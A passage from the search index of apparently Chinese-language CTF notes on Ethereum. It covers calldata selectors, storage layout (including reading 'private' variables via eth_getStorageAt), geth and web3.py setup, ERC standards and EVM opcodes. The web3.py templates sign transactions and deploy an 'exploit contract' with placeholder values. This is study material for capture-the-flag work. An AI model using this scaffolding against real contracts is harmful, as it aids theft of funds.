\u5b57\u6bb5\u5e94\u8be5\u4e3a\u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0cdata \u5b57\u6bb5\u4e3a\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570\uff0c\u79f0\u4e3a calldata\u3002 calldata \u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5f00\u5934\u56db\u4e2a\u5b57\u8282\u4f1a\u8868\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4e5f\u88ab\u79f0\u4e3a function selector\uff1b\u540e\u9762\u7684\u90e8\u5206\u662f\u51fd\u6570\u7684\u53c2\u6570\u3002","title":"\u5408\u7ea6\u7684\u8c03\u7528"},{"location":"ctf/blockchain/eth/basic/#selector","text":"Selector \u662f\u51fd\u6570\u7b7e\u540d\u7684 keccak256 \u54c8\u5e0c\u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\u3002 \u5176\u4e2d\u51fd\u6570\u7b7e\u540d\uff1a \u57fa\u7840\u539f\u578b\u662f\u7531\u51fd\u6570\u540d\u79f0\u52a0\u4e0a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\uff0c\u53c2\u6570\u7c7b\u578b\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u4e14\u65e0\u7a7a\u683c \u5bf9\u4e8e uint \u7c7b\u578b\u8981\u8f6c\u6210 uint64 \u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u4f1a\u5c06\u5176\u6210\u5458\u7c7b\u578b\u5c55\u5f00\u5e76\u7528\u62ec\u53f7\u62ec\u8d77\u6765 \u5728\u8fdb\u884c\u4e00\u4e2a\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u5c06 data \u4e2d\u7684 selector \u4e0e\u5408\u7ea6\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\u8fdb\u884c\u6bd4\u5bf9\uff1a \u5982\u679c\u5b58\u5728\u76f8\u540c\u7684\u51fd\u6570\u7b7e\u540d\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 \u5982\u679c\u4e0d\u5b58\u5728\uff1a \u5982\u679c\u5b58\u5728 fallback \u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 fallback \u51fd\u6570 \u5426\u5219 revert \u76f8\u5e94\u7684\u903b\u8f91\u662f\u5728\u5408\u7ea6\u7f16\u8bd1\u7684\u65f6\u5019\u5199\u5728 runtimeCode \u91cc\u7684\uff0c\u5176\u5927\u81f4\u903b\u8f91\u662f\uff1a if (msg.value) { revert(); } // \u5982\u679c\u4e0d\u662f payable \u7684\u8bdd\u4f1a\u6709\u8fd9\u53e5 if (msg.data.length == 0) { fallback(); } // \u5982\u679c\u6ca1\u6709 fallback \u5c31 revert if (msg.data[0:4] == selector1) { function1(); } else if (msg.data[0:4] == selector2) { function2(); } else { fallback(); // \u5982\u679c\u6709 fallback // revert(); // \u5982\u679c\u6ca1\u6709 fallback }","title":"Selector"},{"location":"ctf/blockchain/eth/basic/#_13","text":"Solidity \u4e2d\u6709\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u533a\u5757\u4fe1\u606f\u3001\u4ea4\u6613\u4fe1\u606f\u7b49\uff1a block.chainid\u3001block.coinbase\u3001block.number\u3001block.timestamp\u2026\u2026 msg.data\uff1a\u5b8c\u6574\u7684 calldata msg.sender\uff1a\u5f53\u524d\u8c03\u7528\u8005\u7684\u5730\u5740 msg.sig\uff1aselector\uff0c\u4e5f\u5c31\u662f calldata \u7684\u524d\u56db\u4e2a\u5b57\u8282 msg.value\uff1a\u4ea4\u6613\u4e2d\u9644\u5e26\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei\uff09 tx.gasprice\uff1a\u4ea4\u6613\u7684 gasprice tx.origin\uff1a\u4ea4\u6613\u7684\u53d1\u8d77\u8005\uff08\u6574\u6761\u8c03\u7528\u94fe\u6700\u5f00\u5934\u7684\u8d26\u6237\uff09","title":"\u5408\u7ea6\u4e2d\u83b7\u53d6\u6570\u636e"},{"location":"ctf/blockchain/eth/basic/#_14","text":"\u4ee5\u592a\u574a\u4f1a\u4e3a\u5408\u7ea6\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5176\u5b58\u50a8\u76f8\u5f53\u4e8e\u4e00\u4e2a \\(2^{256}\\) \u5927\u5c0f\u7684\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u63d2\u69fd\uff08slot\uff09\uff0c\u6bcf\u4e2a\u63d2\u69fd\u7684\u5927\u5c0f\u662f 256 \u4f4d\uff0c\u4e5f\u5c31\u662f 32 \u5b57\u8282\u3002\u6574\u4f53\u5bb9\u91cf\u975e\u5e38\u5de8\u5927\uff0c\u4f46\u5b58\u50a8\u662f\u7a00\u758f\u7684\uff0c\u5373\u53ea\u4f1a\u5b58\u50a8\u6709\u503c\u7684\u63d2\u69fd\u3002 Solidity \u89c4\u5b9a\u4e86\u5408\u7ea6\u5185\u53d8\u91cf\u7684\u5b58\u50a8\u65b9\u5f0f\uff0c\u5927\u81f4\u662f\uff1a \u5355\u4e2a\u503c\u7c7b\u578b \u4ee5\u4f4e\u4f4d\u5bf9\u9f50\uff08\u53f3\u5bf9\u9f50\uff09\u7684\u65b9\u5f0f\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d \u4e00\u4e2a\u57fa\u672c\u7c7b\u578b\u53ea\u4f1a\u5360\u636e\u5b83\u6240\u9700\u7684\u7a7a\u95f4\uff0c\u6bd4\u5982 uint8 \u53ea\u4f1a\u5360\u7528 1 \u5b57\u8282 \u5982\u679c\u5f53\u524d\u63d2\u69fd\u8fd8\u53ef\u4ee5\u5bb9\u7eb3\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u7ee7\u7eed\u5728\u5f53\u524d\u63d2\u69fd\u5b58\u50a8\uff08\u5728\u5f53\u524d\u503c\u201c\u5de6\u8fb9\u201d\uff09 \u5982\u679c\u5f53\u524d\u63d2\u69fd\u5bb9\u7eb3\u4e0d\u4e0b\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u4f1a\u5b58\u50a8\u5728\u4e0b\u4e00\u4e2a\u63d2\u69fd\u4e2d \u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u5b58\u50a8\u65f6\u4e00\u5b9a\u4f1a\u65b0\u5f00\u4e00\u4e2a\u63d2\u69fd\uff0c\u5176\u5185\u90e8\u5b58\u50a8\u4ecd\u7136\u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219 \u4f8b\u5982\u5982\u4e0b\u5408\u7ea6\u7684\u5b58\u50a8\uff1a contract C { address a ; uint8 b ; uint256 c ; bytes24 d ; } // ----------------------------------------------------- // | unused (11) | b (1) | a (20) | <- slot 0 // ----------------------------------------------------- // | c (32) | <- slot 1 // ----------------------------------------------------- // | unused (8) | d (24) | <- slot 2 // ----------------------------------------------------- \u6620\u5c04 \u5373 solidity \u4e2d\u7684 mapping \u4f8b\u5982 mapping(address => uint256) a \u4f1a\u5148\u5728\u5982\u4e0a\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09 \u6620\u5c04\u4e2d\u952e addr \u5bf9\u5e94\u7684\u503c\u4f1a\u5b58\u5728 keccak256(addr . p) \u7684\u63d2\u69fd\u4e2d\uff08. \u8868\u793a\u8fde\u63a5\uff09 \u52a8\u6001\u6570\u7ec4 \u540c\u6837\u5728\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd slot p\uff0c\u5176\u5185\u5bb9\u662f\u8be5\u52a8\u6001\u6570\u7ec4\u73b0\u5728\u7684\u957f\u5ea6 \u6570\u7ec4\u5185\u5bb9\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p) \u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32 \u5982\u679c\u957f\u5ea6\u5c0f\u4e8e 32 \u5b57\u8282 \u548c\u5355\u4e2a\u503c\u7c7b\u578b\u4e00\u6837\uff0c\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d\uff0c\u9ad8\u4f4d\u5bf9\u9f50\uff08\u5de6\u5bf9\u9f50\uff09 \u8be5\u63d2\u69fd\u6700\u4f4e\u4f4d\u4f1a\u5b58\u50a8 length * 2 \u5982\u679c\u957f\u5ea6\u8d85\u8fc7\u4e86 31 \u5b57\u8282 \u5f53\u524d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09\u5b58\u50a8 length * 2 + 1 \u6570\u7ec4\u5185\u5bb9\u5b9e\u9645\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p) \u4ee5\u592a\u574a\u4e0a\u7684\u8fd9\u4e9b\u5b58\u50a8\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5373\u4f7f\u5728 Solidity \u4e2d\u89c4\u5b9a\u4e86\u662f private \u53d8\u91cf\uff0c\u4e5f\u4e0d\u4f1a\u5728\u5b58\u50a8\u4e2d\u9690\u85cf\u3002\u8fd9\u4e9b\u5b58\u50a8\u53ef\u4ee5\u901a\u8fc7 rpc \u7684 eth_getStorageAt \u63a5\u53e3\u6765\u8bfb\u53d6\uff0c\u5373 getStorageAt(address, slot)\u3002","title":"\u5b58\u50a8"},{"location":"ctf/blockchain/eth/basic/#_15","text":"\u5728 geth\uff08Go Ethereum\uff09\u5b9e\u73b0\u7684\u4ee5\u592a\u574a\u534f\u8bae\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 rpc\uff08remote process call\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u65b9\u5f0f\u6765\u548c\u4ee5\u592a\u574a\u7f51\u7edc\u8fdb\u884c\u4ea4\u4e92\u3002","title":"\u4ea4\u4e92"},{"location":"ctf/blockchain/eth/basic/#geth","text":"geth \u662f\u4ee5\u592a\u574a\u5b98\u65b9\u63d0\u4f9b\u7684\u4e00\u4e2a\u5b9e\u73b0\u4e86\u4ee5\u592a\u574a\u534f\u8bae\u7684\u5ba2\u6237\u7aef\uff0c\u662f\u4ee5\u592a\u574a\u7f51\u7edc\u7684\u4e00\u4e2a\u5165\u53e3\u70b9\u3002geth \u7684 rpc \u63a5\u53e3\u53ef\u4ee5\u901a\u8fc7 http \u6216\u8005 websocket \u6765\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 ipc \u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u901a\u8fc7 geth \u6765\u521b\u5efa\u8282\u70b9\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230\u5df2\u6709\u7684\u4ee5\u592a\u574a\u7f51\u7edc\u3001\u6d4b\u8bd5\u7f51\u7edc\u3001\u79c1\u6709\u7f51\u7edc\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 geth \u6765\u642d\u5efa\u79c1\u94fe\u3002 \u4e00\u822c\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u4f1a\u6709\u4e00\u4e2a\u5df2\u7ecf\u642d\u597d\u7684\u79c1\u94fe\uff0c\u7136\u540e\u7ed9\u51fa\u4e00\u4e2a rpc \u63a5\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7 geth attach \u7684\u65b9\u5f0f\u8fde\u63a5\u7136\u540e\u6267\u884c\u547d\u4ee4\u3002\u5177\u4f53\u7684\u547d\u4ee4\u7528\u6cd5\u5c31\u4e0d\u5199\u4e86\u3002 \u4e00\u822c\u7684 CTF \u9898\u76ee\u4f1a\u4f7f\u7528 chainflag/eth-challenge-base \u6765\u642d\u5efa\u73af\u5883\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u79c1\u94fe\u3001\u9632\u706b\u5899\u3001\u6c34\u7ba1\uff08faucet\uff0c\u7528\u4e8e\u53d1\u653e eth\uff09\u4ee5\u53ca\u9898\u76ee\u63a5\u53e3\u3002\u8fd9\u4e2a\u9632\u706b\u5899\u4e3a\u4e86\u9632\u6b62\u722c\u94fe\u627e\u522b\u4eba\u7684\u4ea4\u6613\u4f1a\u53ea\u4fdd\u7559\u51e0\u4e2a rpc \u65b9\u6cd5\uff0c\u901a\u8fc7 geth \u6765\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u90e8\u7f72\u5408\u7ea6\u3001\u53d1\u9001\u4ea4\u6613\u662f\u6bd4\u8f83\u4e0d\u65b9\u4fbf\u7684\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528 web3.js / web3.py \u6765\u8fdb\u884c\u4ea4\u4e92\u3002","title":"geth"},{"location":"ctf/blockchain/eth/basic/#web3py","text":"web3.py \u662f\u4e00\u4e2a python \u7684\u4ee5\u592a\u574a rpc \u5ba2\u6237\u7aef\u3002\u7531\u4e8e challenge base \u7684\u9632\u706b\u5899\u53ea\u7559\u4e0b\u4e86\u6781\u5c11\u65b9\u6cd5\uff0c\u6240\u4ee5\u53d1\u9001\u4ea4\u6613\u65f6\u8981\u5148 sighTransaction \u624b\u52a8\u7b7e\u7f72\uff0c\u7136\u540e sendRawTransaction \u53d1\u9001\u4ea4\u6613\u6570\u636e\u3002 \u5e38\u7528\u4ea4\u4e92\u4ee3\u7801\uff1a from web3 import Web3 # from rich import print w3 = Web3 ( Web3 . HTTPProvider ( '...' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : w3 . eth . chainId , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } def transact ( src , dst , data , value = 0 , gas = 0x200000 ): data = get_txn ( src , dst , data , value , gas ) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) return txn_receipt print ( \"[+] Deploying exploit contract...\" ) txn_receipt = transact ( hacker , None , bytes . fromhex ( \"...\" )) print ( txn_receipt ) print ( \"[*] Exploit contract deployed at\" , txn_receipt [ 'contractAddress' ]) contractAddress = txn_receipt [ 'contractAddress' ] from web3 import Web3 , HTTPProvider # from rich import print import json w3 = Web3 ( HTTPProvider ( '...' )) hacker = \"...\" target = \"...\" privateKey = \"...\" def run ( sender , func , value = 0 , gas = 0x200000 ): txn = func . buildTransaction ({ 'nonce' : w3 . eth . getTransactionCount ( sender ), 'gas' : gas , 'gasPrice' : w3 . toWei ( 1.1 , 'gwei' ), \"value\" : w3 . toWei ( value , 'ether' ), }) if gas == None : txn [ 'gas' ] = w3 . eth . estimateGas ( txn ) transaction = w3 . eth . account . signTransaction ( txn , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) return txn_receipt bytecode , abi = json . load ( open ( \"Exploit.json\" )) exploitContract = w3 . eth . contract ( abi = abi , bytecode = bytecode ) print ( \"[+] Deploying exploit contract...\" ) txn_receipt = run ( hacker , exploitContract . constructor ( target )) print ( \"[*] Exploit contract deployed at\" , txn_receipt [ 'contractAddress' ]) exploitContract = w3 . eth . contract ( abi = abi , address = txn_receipt [ 'contractAddress' ])","title":"web3.py"},{"location":"ctf/blockchain/eth/basic/#remix-metamask","text":"Remix IDE \u63d0\u4f9b\u4e86\u8c03\u8bd5\u7684 Javascript VM\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8fde\u63a5\u4ee5\u592a\u574a\u4e3b\u94fe\u3001\u6d4b\u8bd5\u94fe\uff0c\u8fd8\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u5230 Web3 Provider\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230 Injected Provider\uff0c\u6bd4\u5982 MetaMask\u3002MetaMask \u4e2d\u4e5f\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7f51\u7edc\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u5728 Remix \u4e2d\u8fdb\u884c\u5408\u7ea6\u7684\u90e8\u7f72\u548c\u8c03\u7528\u4e86\u3002 \u4e0d\u8fc7\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u53ef\u80fd\u4e0d\u592a\u597d\u7528\u3002\u6211\u4e00\u822c\u4f1a\u9009\u62e9\u5728 JS VM \u4e2d\u8c03\u8bd5\u597d\u540e\u901a\u8fc7 web3.py \u6765\u4ea4\u4e92\u3002","title":"Remix + MetaMask"},{"location":"ctf/blockchain/eth/erc/","text":"ERC \u6807\u51c6 \u00b6 Abstract \u5206\u6790\u3001\u8bb0\u5f55\u4e00\u4e9b\u5e38\u7528\u7684 ERC \u6807\u51c6 EIP \u4e0e ERC \u00b6 EIP\uff08Ethereum Improvement Proposals\uff0c\u4ee5\u592a\u574a\u6539\u8fdb\u63d0\u6848\uff09\u662f\u5f00\u53d1\u8005\u6539\u8fdb\u4ee5\u592a\u574a\u5e73\u53f0\u7684\u63d0\u6848\u5217\u8868\uff08\u7c7b\u4f3c python \u7684 pep\uff09\uff0c\u5305\u542b\u4e86\u5f88\u591a\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u6709\u6838\u5fc3\u534f\u8bae\u3001\u5ba2\u6237\u7aef API\u3001\u5408\u7ea6\u6807\u51c6\u7b49\u2026\u2026 \u53ef\u4ee5\u5728 eips.ethereum.org \u627e\u5230\u5168\u90e8\u7684 EIP \u5217\u8868\u3002 \u5176\u4e2d\u4e0e\u5408\u7ea6\u6807\u51c6\u6709\u5173\u7684\u79f0\u4e3a ERC \uff08Ethereum Request for Comment\uff09\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u5b9e\u7528\u7684\u6807\u51c6\u3002\u800c\u4e14 OpenZeppelin \u4e5f\u5b9e\u73b0\u4e86\u5176\u4e2d\u7684\u4e00\u4e9b OpenZeppelin/openzeppelin-contracts \u4e0b\u9762\u6765\u5206\u522b\u770b\u4e00\u4e0b\u5176\u4e2d\u51e0\u4e2a\u7ecf\u5178\u5e38\u7528\u7684 ERC ERC-20 \u00b6 ERC-20 \u89c4\u5b9a\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff08token\uff09\u6807\u51c6\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u57fa\u7840\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8f6c\u79fb\u4ee3\u5e01\u3001\u6388\u6743\u7b49\u3002","title":"ERC \u6807\u51c6"},{"location":"ctf/blockchain/eth/erc/#erc","text":"Abstract \u5206\u6790\u3001\u8bb0\u5f55\u4e00\u4e9b\u5e38\u7528\u7684 ERC \u6807\u51c6","title":"ERC \u6807\u51c6"},{"location":"ctf/blockchain/eth/erc/#eip-erc","text":"EIP\uff08Ethereum Improvement Proposals\uff0c\u4ee5\u592a\u574a\u6539\u8fdb\u63d0\u6848\uff09\u662f\u5f00\u53d1\u8005\u6539\u8fdb\u4ee5\u592a\u574a\u5e73\u53f0\u7684\u63d0\u6848\u5217\u8868\uff08\u7c7b\u4f3c python \u7684 pep\uff09\uff0c\u5305\u542b\u4e86\u5f88\u591a\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u6709\u6838\u5fc3\u534f\u8bae\u3001\u5ba2\u6237\u7aef API\u3001\u5408\u7ea6\u6807\u51c6\u7b49\u2026\u2026 \u53ef\u4ee5\u5728 eips.ethereum.org \u627e\u5230\u5168\u90e8\u7684 EIP \u5217\u8868\u3002 \u5176\u4e2d\u4e0e\u5408\u7ea6\u6807\u51c6\u6709\u5173\u7684\u79f0\u4e3a ERC \uff08Ethereum Request for Comment\uff09\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u5b9e\u7528\u7684\u6807\u51c6\u3002\u800c\u4e14 OpenZeppelin \u4e5f\u5b9e\u73b0\u4e86\u5176\u4e2d\u7684\u4e00\u4e9b OpenZeppelin/openzeppelin-contracts \u4e0b\u9762\u6765\u5206\u522b\u770b\u4e00\u4e0b\u5176\u4e2d\u51e0\u4e2a\u7ecf\u5178\u5e38\u7528\u7684 ERC","title":"EIP \u4e0e ERC"},{"location":"ctf/blockchain/eth/erc/#erc-20","text":"ERC-20 \u89c4\u5b9a\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff08token\uff09\u6807\u51c6\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u57fa\u7840\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8f6c\u79fb\u4ee3\u5e01\u3001\u6388\u6743\u7b49\u3002","title":"ERC-20"},{"location":"ctf/blockchain/eth/evm/","text":"\u4ee5\u592a\u574a\u865a\u62df\u673a \u00b6 Abstract \u4ee5\u592a\u574a\u7684\u667a\u80fd\u5408\u7ea6\u4f1a\u5728 EVM\uff08Ethereum Virtual Machine\uff0c\u4ee5\u592a\u574a\u865a\u62df\u673a\uff09\u4e0a\u8fd0\u884c\u3002\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd EVM \u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u53c2\u8003 Ethereum Virtual Machine (EVM) Opcodes Ethereum Yellow Paper Ethereum Developer Documentation Ethereum EVM Illustrated EVM \u7b80\u4ecb \u00b6 EVM \u662f\u4e00\u4e2a\u6808\u7ed3\u6784\u7684\u865a\u62df\u673a\uff0c\u6ca1\u6709\u5bc4\u5b58\u5668\uff0c\u6808\u7684\u6df1\u5ea6\u6700\u5927 1024\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f 256 \u4f4d\uff0832 \u5b57\u8282\uff09\u7684\u3002\u540c\u65f6\u5728\u6267\u884c\u671f\u95f4\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u77ac\u65f6\u5185\u5b58\uff08memory\uff09\uff0c\u5176\u6267\u884c\u540e\u4e0d\u4f1a\u6301\u4e45\u5b58\u5728\u3002 EVM \u6709\u4e00\u5957\u6307\u4ee4\u96c6\uff0c\u6bcf\u6761\u6307\u4ee4\u90fd\u6709\u4e00\u4e2a 8 \u4f4d\u7684 opcode\uff0c\u6307\u4ee4\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u3001\u6808\u5143\u7d20\u7b49\u3002 EVM \u5b57\u8282\u7801 \u00b6 \u5b8c\u6574\u7684 EVM \u5b57\u8282\u7801\u53ca\u89e3\u91ca\u53ef\u89c1\uff1a ethervm.io \uff0c\u8fd9\u91cc\u8fdb\u884c\u4e00\u4e0b\u5206\u7c7b\uff1a \u8fd0\u7b97\u6307\u4ee4 \u00b6 \u6ca1\u6709\u7279\u6b8a\u8bf4\u660e\u90fd\u662f\u5728\u6a21 2^256 \u7684\u610f\u4e49\u4e0b\u8fdb\u884c\u8fd0\u7b97\u3002 Note \u4e0b\u9762\u8868\u683c\u4e2d\u7684\u6808\u8f93\u5165\u3001\u6808\u8f93\u51fa\u5747\u662f\u5de6\u4fa7\u4e3a\u6808\u9876 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 01 ADD a, b a + b 02 MUL a, b a * b 03 SUB a, b a - b 04 DIV a, b a // b uint256 \u9664\u6cd5 05 SDIV a, b a // b int256 \u9664\u6cd5 06 MOD a, b a % b uint256 \u53d6\u6a21 07 SMOD a, b a % b int256 \u53d6\u6a21 08 ADDMOD a, b, c (a + b) % c 09 MULMOD a, b, c (a * b) % c 0a EXP a, b a ** b 0b SIGNEXTEND b, x signextend(x, b) \u5c06 x \u4ece (b+1)*8 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 256 \u4f4d \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 10 LT a, b a < b 11 GT a, b a > b 12 SLT a, b a < b int256 \u6bd4\u8f83 13 SGT a, b a > b int256 \u6bd4\u8f83 14 EQ a, b a == b 15 ISZERO a a == 0 16 AND a, b a & b 17 OR a, b a | b 18 XOR a, b a ^ b 19 NOT a ~a 1a BYTE i, x x[i] \u53d6 x \u7684\u7b2c i \u4e2a\u5b57\u8282\uff08\u4ece\u9ad8\u4f4d\u7b97\uff09 1b SHL a, b b << a 1c SHR a, b b >> a \u903b\u8f91\u53f3\u79fb 1d SAR a, b b >> a \u7b97\u6570\u53f3\u79fb \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa 20 SHA3 offset, length keccak256(mem[offset:offset+length]) \u7279\u6b8a\u6307\u4ee4 \u00b6 \u4e00\u4e9b\u4ee5\u592a\u574a\u7279\u6709\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u53d6\u4e00\u4e9b\u4ea4\u6613\u4fe1\u606f\u3001\u533a\u5757\u4fe1\u606f\u7b49 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 30 ADDRESS address \u5f53\u524d\u5408\u7ea6\u5730\u5740 31 BALANCE addr addr.balance 32 ORIGIN tx.origin 33 CALLER msg.sender 34 CALLVALUE msg.value 35 CALLDATALOAD i msg.data[i:i+32] 36 CALLDATASIZE len(msg.data) 38 CODESIZE len(this.code) 3a GASPRICE tx.gasprice 3b EXTCODESIZE addr len(addr.code) 3d RETURNDATASIZE len(returndata) \u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u8fd4\u56de\u6570\u636e\u957f\u5ea6 3f EXTCODEHASH addr keccak256(addr.code) \u5730\u5740\u4e0d\u5b58\u5728\u5219\u8fd4\u56de 0 40 BLOCKHASH number block.blockHash(blockNumber) 41 COINBASE block.coinbase 42 TIMESTAMP block.timestamp 43 NUMBER block.number 44 DIFFICULTY block.difficulty 45 GASLIMIT block.gaslimit 46 CHAINID chainid 47 SELFBALANCE this.balance 48 BASEFEE block.basefee \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u63cf\u8ff0 37 CALLDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = msg.data[dataOffset:dataOffset+length] 39 CODECOPY memOffset, codeOffset, length mem[memOffset:memOffset+length] = this.code[codeOffset:codeOffset+length] 3c EXTCODECOPY addr, memOffset, codeOffset, length mem[memOffset:memOffset+length] = addr.code[codeOffset:codeOffset+length] 3e RETURNDATACOPY memOffset, dataOffset, length mem[memOffset:memOffset+length] = returndata[dataOffset:dataOffset+length] \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 58 PC pc \u5f53\u524d\u6307\u4ee4\u7684\u4f4d\u7f6e 59 MSIZE mem.length \u5185\u5b58\u5927\u5c0f 5a GAS gas \u5269\u4f59 gas \u5b58\u50a8\u6307\u4ee4 \u00b6 EVM \u6267\u884c\u65f6\u6709\u4e09\u4e2a\u5b58\u50a8\u4f4d\u7f6e\uff1a \u6808\uff08stack\uff09\uff1a\u901a\u8fc7 PUSH\u3001POP \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u6808\u4e0a\u8fdb\u884c\u8bfb\u5199 \u5185\u5b58\uff08memory\uff09\uff1a\u901a\u8fc7 MLOAD\u3001MSTORE \u7cfb\u5217\u5728\u5f53\u524d\u6267\u884c\u7684\u5185\u5b58\u4e0a\u8fdb\u884c\u8bfb\u5199 \u94fe\u4e0a\u5b58\u50a8\uff08storage\uff09\uff1a\u901a\u8fc7 SLOAD\u3001SSTORE \u7cfb\u5217\u5728\u5f53\u524d\u5408\u7ea6\u7684\u5b58\u50a8\u533a\u8fdb\u884c\u8bfb\u5199\uff08\u662f\u6301\u4e45\u5316\u7684\uff09 \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 50 POP a 51 MLOAD offset mem[offset:offset+32] 52 MSTORE offset, value mem[offset:offset+32] = value 53 MSTORE8 offset, value mem[offset] = value 54 SLOAD key storage[key] 55 SSTORE key, value storage[key] = value \u5e76\u4e14\u63d0\u4f9b\u4e86\u5f88\u591a PUSH \u6307\u4ee4\uff0c\u5206\u522b\u5904\u7406\u4e0d\u540c\u5927\u5c0f\u7684\u8f93\u5165\u7acb\u5373\u6570\uff1a \u5b57\u8282\u7801 \u540d\u79f0 \u6808\u8f93\u5165 \u6808\u8f93\u51fa \u63cf\u8ff0 60 PUSH1 uint8 \u538b\u5165\u4e00\u4e2a 1 \u5b57\u8282\u7684\u503c 61 PUSH2 uint16 \u538b\u5165\u4e00\u4e2a 2 \u5b57\u8282\u7684\u503c ... ... ... ... ... 7f PUSH32 uint256 \u538b\u5165\u4e00\u4e2a 32 \u5b57\u8282\u7684\u503c \u4ee5\u53ca\u4e00\u4e9b\u6808\u4e0a\u7684\u6570\u636e\u64cd\u4f5c\uff0c\u5373 DUP \u548c SWAP\uff0c\u5206\u522b\u8868\u793a\u590d\u5236\u6808\u4e0a\u67d0\u5904\u6570\u636e\u5230\u6808\u9876\u4ee5\u53ca\u4ea4\u6362\u6808\u4e0a\u4e24\u4e2a\u6570\u636e\uff1a \u5b57\u8282\u7801 \u540d\u79f0 